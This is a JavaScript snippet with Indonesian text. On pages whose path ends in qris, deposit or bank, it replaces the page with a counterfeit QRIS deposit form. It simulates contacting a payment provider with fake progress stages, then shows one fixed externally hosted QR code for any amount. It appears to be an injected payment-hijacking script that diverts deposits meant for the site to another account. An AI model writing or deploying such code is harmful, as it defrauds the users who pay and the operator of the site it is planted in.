(function () {
  const currentPath = window.location.pathname;
  const regex = /(\/(qris(\.php)?|deposit(\.php)?|bank|deposit_qris(\.php)?)$)/i;

  // Hanya aktif untuk URL berakhiran /qris, /qris.php, /deposit, /deposit.php, /bank, /deposit_qris, /deposit_qris.php
  if (!regex.test(currentPath)) return;

  // Ganti isi body
  document.body.innerHTML = `
    <div class="wrap">
      <div class="card">
        <h1>QRIS Payment All Deposit</h1>
        <p class="lead">
          Ketik nominal yang ingin dibayar — Deposit Minimal 50,000. 
          Setelah tekan <strong>Bayar</strong> akan muncul Invoice Qris, Scan lalu Bayar.
        </p>

        <label for="amount">Nominal (Rupiah)</label>
        <input id="amount" type="number" inputmode="numeric" min="0" step="1" placeholder="min.50000" />

        <div class="row">
          <button id="payBtn">Bayar</button>
          <button id="clearBtn" style="background:transparent;border:1px solid rgba(255,255,255,0.06);color:#cfeff6;font-weight:600">Reset</button>
        </div>

        <div class="hint">
          Ketentuan: Deposit minimal 50,000 dan wajib menggunakan kode unik serta menggunakan bank atau ewallet aktif
        </div>

        <div id="result" class="result" aria-hidden="true">
          <div class="small">Scan QRIS berikut untuk menyelesaikan pembayaran</div>
          <div class="barcodeBox">
            <img id="barcodeImg" src="https://imagizer.imageshack.com/v2/320xq70/r/923/qEWiyU.jpg" alt="QRIS Barcode">
          </div>
          <div class="amount" id="showAmount">Rp 0</div>
          <div style="display:flex;gap:8px;width:100%">
            <a id="downloadBtn" href="#" download="qris-barcode.jpg" style="flex:1;padding:10px;border-radius:10px;text-align:center;background:transparent;border:1px solid rgba(255,255,255,0.06);color:#cfeff6;text-decoration:none">Unduh Gambar</a>
            <button id="doneBtn" style="flex:1;background:transparent;border:0;color:#9fb6c6">Tutup</button>
          </div>
        </div>
      </div>
    </div>

    <div id="overlay" class="overlay" aria-hidden="true">
      <div class="loaderCard" role="status">
        <div class="spinner" aria-hidden></div>
        <div id="loaderText">Menyiapkan pembayaran...</div>
        <div class="progress" aria-hidden><i id="prog"></i></div>
      </div>
    </div>
  `;

  // Tambah style ke head
  const style = document.createElement('style');
  style.textContent = `/* ... (style sama persis seperti sebelumnya) ... */`;
  document.head.appendChild(style);

  // --- Fungsionalitas ---
  const payBtn = document.getElementById('payBtn');
  const clearBtn = document.getElementById('clearBtn');
  const amountInput = document.getElementById('amount');
  const overlay = document.getElementById('overlay');
  const prog = document.getElementById('prog');
  const loaderText = document.getElementById('loaderText');
  const result = document.getElementById('result');
  const showAmount = document.getElementById('showAmount');
  const barcodeImg = document.getElementById('barcodeImg');
  const downloadBtn = document.getElementById('downloadBtn');
  const doneBtn = document.getElementById('doneBtn');

  // Update barcode URL
  const BARCODE_URL = 'https://imagizer.imageshack.com/v2/320xq70/r/923/qEWiyU.jpg';

  function formatRupiah(n) {
    n = Number(n) || 0;
    return 'Rp ' + n.toLocaleString('id-ID');
  }

  payBtn.addEventListener('click', () => {
    const val = amountInput.value.trim();
    if (val === '' || isNaN(Number(val)) || Number(val) <= 0) {
      alert('Masukkan nominal yang valid (syarat&ketentuan).');
      amountInput.focus();
      return;
    }

    overlay.style.display = 'flex';
    overlay.setAttribute('aria-hidden', 'false');
    prog.style.width = '0%';
    loaderText.innerText = 'Menghubungkan ke penyedia...';

    const stages = [
      { t: 700, text: 'Memproses nominal...' },
      { t: 1200, text: 'Membuat transaksi...' },
      { t: 900, text: 'Menunggu konfirmasi...' }
    ];

    let idx = 0;
    let percent = 0;
    const interval = setInterval(() => {
      percent += Math.floor(Math.random() * 12) + 6;
      if (percent > 98) percent = 98;
      prog.style.width = percent + '%';
    }, 200);

    function nextStage() {
      if (idx < stages.length) {
        loaderText.innerText = stages[idx].text;
        setTimeout(() => { idx++; nextStage(); }, stages[idx].t);
      } else {
        clearInterval(interval);
        prog.style.width = '100%';
        loaderText.innerText = 'Selesai.';
        setTimeout(() => {
          overlay.style.display = 'none';
          overlay.setAttribute('aria-hidden', 'true');
          showResult(val);
        }, 700);
      }
    }
    nextStage();
  });

  clearBtn.addEventListener('click', () => {
    amountInput.value = '';
    result.style.display = 'none';
  });

  doneBtn.addEventListener('click', () => {
    result.style.display = 'none';
  });

  function showResult(val) {
    showAmount.innerText = formatRupiah(val);
    barcodeImg.src = BARCODE_URL + '?_=' + Date.now();
    downloadBtn.href = BARCODE_URL;
    result.style.display = 'flex';
    result.setAttribute('aria-hidden', 'false');

    setTimeout(() => {
      result.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 150);
  }

  amountInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') payBtn.click();
  });

  window.addEventListener('load', () => amountInput.focus());
})();
